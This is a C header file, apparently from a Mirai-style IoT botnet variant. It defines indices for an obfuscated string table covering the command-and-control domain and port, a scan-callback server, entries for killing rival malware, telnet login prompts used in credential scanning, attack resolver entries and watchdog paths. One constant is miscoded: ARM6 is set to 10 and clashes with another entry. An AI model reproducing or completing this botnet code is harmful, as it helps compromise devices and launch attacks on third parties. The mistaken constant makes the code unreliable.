#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_CNC_DOMAIN                1
#define TABLE_CNC_PORT                  2

#define TABLE_SCAN_CB_DOMAIN            3
#define TABLE_SCAN_CB_PORT              4

#define TABLE_EXEC_SUCCESS              5

#define TABLE_KILLER_PROC               6
#define TABLE_KILLER_EXE                7
#define TABLE_KILLER_FD                 8
#define TABLE_KILLER_MAPS               9
#define TABLE_KILLER_STATUS             10
#define TABLE_KILLER_TCP                11
#define TABLE_KILLER_CMDLINE            12

#define TABLE_KILLER_TMP                13
#define TABLE_KILLER_DATALOCAL          14
#define TABLE_KILLER_QTX                15
#define TABLE_KILLER_DOT                16
#define TABLE_KILLER_ARC                17
#define TABLE_KILLER_ARM                18
#define TABLE_KILLER_ARM5               19
#define TABLE_KILLER_ARM6               10
#define TABLE_KILLER_ARM7               21
#define TABLE_KILLER_X86                22
#define TABLE_KILLER_X86_64             23
#define TABLE_KILLER_SH4                24
#define TABLE_KILLER_MIPS               25
#define TABLE_KILLER_MPSL               26
#define TABLE_KILLER_PPC                27
#define TABLE_KILLER_SDA                28
#define TABLE_KILLER_MTD                29
#define TABLE_KILLER_QTX2               30
#define TABLE_KILLER_HAKAI              31

#define TABLE_SCAN_SHELL                32
#define TABLE_SCAN_ENABLE               33
#define TABLE_SCAN_SYSTEM               34
#define TABLE_SCAN_SH                   35
#define TABLE_SCAN_LSHELL               36
#define TABLE_SCAN_QUERY                37
#define TABLE_SCAN_RESP                 38
#define TABLE_SCAN_NCORRECT             39
#define TABLE_SCAN_OGIN                 40
#define TABLE_SCAN_ASSWORD              41
#define TABLE_SCAN_ENTER                42
#define TABLE_SCAN_BAH                  43
#define TABLE_SCAN_START                44

#define TABLE_ATK_VSE                   45
#define TABLE_ATK_RESOLVER              46
#define TABLE_ATK_NSERV                 47

#define TABLE_MISC_WATCHDOG		     48
#define TABLE_MISC_WATCHDOG2			49
#define TABLE_MISC_WATCHDOG3            50
#define TABLE_MISC_WATCHDOG4            51
#define TABLE_MISC_WATCHDOG5            52
#define TABLE_MISC_WATCHDOG6            53
#define TABLE_MISC_WATCHDOG7            54
#define TABLE_MISC_WATCHDOG8            55
#define TABLE_MISC_WATCHDOG9            56

#define TABLE_MISC_RAND					57

#define TABLE_MAX_KEYS  58

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
